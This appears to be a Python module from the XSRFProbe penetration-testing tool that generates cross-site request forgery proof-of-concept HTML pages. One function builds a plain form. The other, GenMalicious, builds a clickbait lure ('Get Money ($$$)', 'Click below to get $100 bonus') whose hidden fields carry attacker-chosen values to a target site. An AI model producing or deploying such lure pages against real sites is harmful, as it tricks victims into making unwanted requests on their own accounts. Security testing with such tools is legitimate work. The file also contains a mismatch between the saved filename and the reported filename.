#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#-:-:-:-:-:-:-::-:-:#
#    XSRF Probe     #
#-:-:-:-:-:-:-::-:-:#

# Author: 0xInfection
# This module requires XSRFProbe
# https://github.com/0xInfection/XSRFProbe

from core.colors import *
from ast import literal_eval
from files.config import OUTPUT_DIR
from bs4 import BeautifulSoup, Tag
from core.prettify import formPrettify

def GenNormalPoC(action, fields, method='POST', encoding_type='application/x-www-form-urlencoded'):
    """
     Generate a normal CSRF PoC using basic form data
     """
    print(GR, 'Generating normal PoC Form...' )
    print(color.RED+'\n +--------------+')
    print(color.RED+' |   Form PoC   |')
    print(color.RED+' +--------------+\n'+color.CYAN)
    # Main starting which we will use to generate form.
    # Small hack to make beautifulsoup work in the reverse way ;)
    content = BeautifulSoup("<html></html>", "html.parser")
    html_tag = content.find("html")
    title_tag = content.new_tag('title')
    # Adding the title_tag
    title_tag.string = 'CSRF PoC'
    html_tag.append(title_tag)
    head_tag = content.new_tag('h2')
    # Adding a <h2> tag for heading
    head_tag.string = 'Your CSRF PoC'
    html_tag.append(head_tag)
    # Init to the form and stuff
    form_tag = content.new_tag("form", action=action, method=method, enctype=encoding_type)
    html_tag.append(form_tag)
    # We generate the form by taking input and stuff.
    for field in literal_eval(fields):
        label_tag = content.new_tag('label')
        label_tag.string = field['label']
        field_tag = content.new_tag("input", type=field['type'], value=field['value'])
        field_tag['name'] = field['name']
        form_tag.append(label_tag)
        form_tag.append(field_tag)
    # The form submit button and tag
    submit_tag = content.new_tag("input", type="submit", value='Submit')
    form_tag.append(submit_tag)
    br_tag = content.new_tag('br')
    html_tag.append(br_tag)
    footer_tag = content.new_tag('footer')
    html_tag.append(footer_tag)
    small_tag = content.new_tag('small')
    # Fancy brand tag ;p
    small_tag.string = '(i) This PoC form was generated by XSRFProbe.'
    footer_tag.append(small_tag)
    formPrettify(content.prettify())
    print('')
    # Write out the file af o ]})
    fi = open(OUTPUT_DIR+action.split('//')[1].replace('/','-')+'-csrf-poc.html', 'w+', encoding='utf8')
    fi.write(content.prettify())
    fi.close()
    print(G+'PoC successfully saved under '+color.ORANGE+OUTPUT_DIR+action.split('//')[1].replace('/','-')+'-csrf-poc.html')

def GenMalicious(action, fields, method='POST', encoding_type='application/x-www-form-urlencoded'):
    """
     Generate a malicious CSRF PoC using basic form data
     """
    print(GR, 'Generating malicious PoC Form...' )
    print(color.RED+'\n +-------------------+')
    print(color.RED+' |   Malicious PoC   |')
    print(color.RED+' +-------------------+\n'+color.CYAN)
    content = BeautifulSoup("<html></html>", "html.parser")
    html_tag = content.find("html")
    title_tag = content.new_tag('title')
    title_tag.string = 'Get Money ($$$)'
    html_tag.append(title_tag)
    head_tag = content.new_tag('p')
    # Doesn't look clickbait at all :p
    # TODO: WIll improve this is future.
    head_tag.string = 'Click below to get $100 bonus.'
    html_tag.append(head_tag)
    form_tag = content.new_tag("form", action=action, method=method, enctype=encoding_type)
    html_tag.append(form_tag)
    # This is where we get the forms' field values
    # Since it is a malicious form, all the form field values must be hidden ;)
    for field in literal_eval(fields):
        if not field['value']:
            # So that is why we ask user for input ;)
            q = input(color.ORANGE+' [+] Enter field value for "'+color.GREY+field['label']+'" :> '+color.CYAN)
            field_tag = content.new_tag("input", type='hidden', value=q)
        else:
            field_tag = content.new_tag("input", type='hidden', value=field['value'])
        field_tag['name'] = field['name']
        form_tag.append(field_tag)

    submit_tag = content.new_tag("input", type="submit", value='Get It')
    form_tag.append(submit_tag)
    # Print out the form pretty well formatted
    formPrettify(content.prettify())
    print('')
    # Print out the directory where it is saved
    fi = open(OUTPUT_DIR+action.split('//')[1].replace('/','-')+'-csrf-poc.html', 'w+', encoding='utf8')
    fi.write(content.prettify())
    fi.close()
    print(G+'PoC successfully saved under '+color.ORANGE+OUTPUT_DIR+action.split('//')[1].replace('/','-')+'-malicious-poc.html')
